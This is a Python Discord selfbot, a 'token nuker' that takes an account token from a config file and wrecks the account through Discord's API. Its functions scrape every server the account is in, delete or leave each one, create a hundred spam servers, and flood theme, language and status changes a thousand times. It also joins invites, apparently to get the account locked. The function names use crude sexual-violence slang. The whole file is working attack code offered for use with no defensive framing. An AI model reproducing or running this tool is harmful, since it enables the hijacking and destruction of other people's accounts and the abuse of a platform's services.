import discord, threading, colorama, requests, time, os, json
from discord.ext import commands
from discord.ext import tasks
from colorama import Fore 
bot = commands.Bot(command_prefix="!", self_bot=True)
bot.remove_command("help")


colorama.init()
with open('config.json') as f:
    data = json.load(f)
    token = data["TOKEN"]
    servername= data["SERVERNAME"]
headers = {
 'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
 'Content-Type': 'application/json',
 'Authorization': token,
}

def tokenfuck():
      global headers
      payload = {
          'theme': "light",
          'locale': "ja",
          'message_display_compact': False,
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'enable_tts_command': False,
          'explicit_content_filter': '0',
          'status': "idle"
      }
      print(f"{Fore.GREEN}[+] {Fore.RED} Fucked Token")
      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
      to_back()

def sezuire():
    global headers
    payload = {
      'theme': "dark"
      }
    payload2 = {
      'theme': "light"
      }
    for i in range(1000):
      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
      print(f"{Fore.GREEN}[+] {Fore.RED} Sent Sezuire")
    to_back()

def langrape():
    global headers
    payload1 = {
          'locale': "ro"
      }
    payload2 = {
          'locale': "ja"
      }
    payload3 = {
          'locale': "fr"
      }
    for i in range(1000):
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload1)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload3)
        print(f"{Fore.GREEN}[+] {Fore.RED} Raping Language")
    to_back()

def statusrape():
      global headers
      payload = {
          'status': "dnd"
      }
      payload2 = {
          'status': "idle"
      }
      payload3 = {
          'status': "invisible"
      } 
      payload4 = {
          'status': "online"
      }
      for i in range(1000):
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload3)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload4)
      to_back()

def serverspam():
    global servername
    global headers
    guild = {
    'name': f"{servername}"
    } 
    for i in range(100):
     requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
     print(f"{Fore.GREEN}[+] {Fore.RED} Created Server Named {Fore.WHITE}{servername}")
    to_back()
def servernuke():
 global headers
 with open("servers.txt", "r") as f:
    servers = f.read().splitlines()
 for lines in servers: 
   requests.post(f'https://discord.com/api/v9/guilds/{lines}/delete', headers=headers)
   requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{lines}', headers=headers)
   print(f'{Fore.GREEN}[+] {Fore.RED}Nuked Guild > {lines}')
   

def tokenstress():
 global headers
 requests.post(f'https://discord.com/api/v9/invites/lol', headers=headers)
 requests.post(f'https://discord.com/api/v9/invites/lgbtq', headers=headers)
 requests.post(f'https://discord.com/api/v9/invites/astfolo', headers=headers)
 requests.post(f'https://discord.com/api/v9/invites/hey', headers=headers)
 requests.post(f'https://discord.com/api/v9/invites/lmao', headers=headers)


def destroy():
  threading.Thread(target=servernuke).start()
  time.sleep(20)
  threading.Thread(target=serverspam).start()
  threading.Thread(target=statusrape).start()
  threading.Thread(target=sezuire).start()
  threading.Thread(target=langrape).start()
  
 



@bot.event
async def on_ready():
 os.remove("servers.txt")
 for guild in bot.guilds:
  server = bot.get_guild(guild.id)
  print(f"{Fore.RED} [+] Scraped {server.id}")
  f = open("servers.txt", "a+")
  f.write(f"{server.id}\n")
 HomeScreen()

def to_back():
 HomeScreen()
def HomeScreen():
  os.system('cls')
  print(f'''
  {Fore.RED}
  {Fore.RED}        ┌─┐┌─┐┌┬┐┌─┐┬  ┌─┐┌─┐  ┌┐┌┬ ┬┬┌─┌─┐┬─┐  ┌┼┐
  {Fore.RED}        ├─┤└─┐ │ │ ││  ├┤ │ │  ││││ │├┴┐├┤ ├┬┘  └┼┐
  {Fore.RED}        ┴ ┴└─┘ ┴ └─┘┴─┘└  └─┘  ┘└┘└─┘┴ ┴└─┘┴└─  └┼┘
  {Fore.RED}                    By oAaron#0001
  {Fore.RED}           ╔══════════════════════════════════╗
  {Fore.RED}           |[1]  serverspam [2]  tokenfuck    |
  {Fore.RED}           |[3]  sezuire    [4]  langrape     |
  {Fore.RED}           |[5]  statusrape [6]  servernuke   |
  {Fore.RED}           |[7] destroy     [8]  locktoken    |
  {Fore.RED}           ╚══════════════════════════════════╝
  ''')                           
  shit = input("[$] >> ")
  if shit == '1':
    serverspam()
  if shit == '2':
      tokenfuck()
  if shit == '3':
      sezuire()
  if shit == '4':
      langrape() 
  if shit == '5':
     statusrape()
  if shit == '6':
     servernuke()
  if shit == '7':
    destroy()
  if shit == '8':
   tokenstress()




bot.run(token, bot = False)
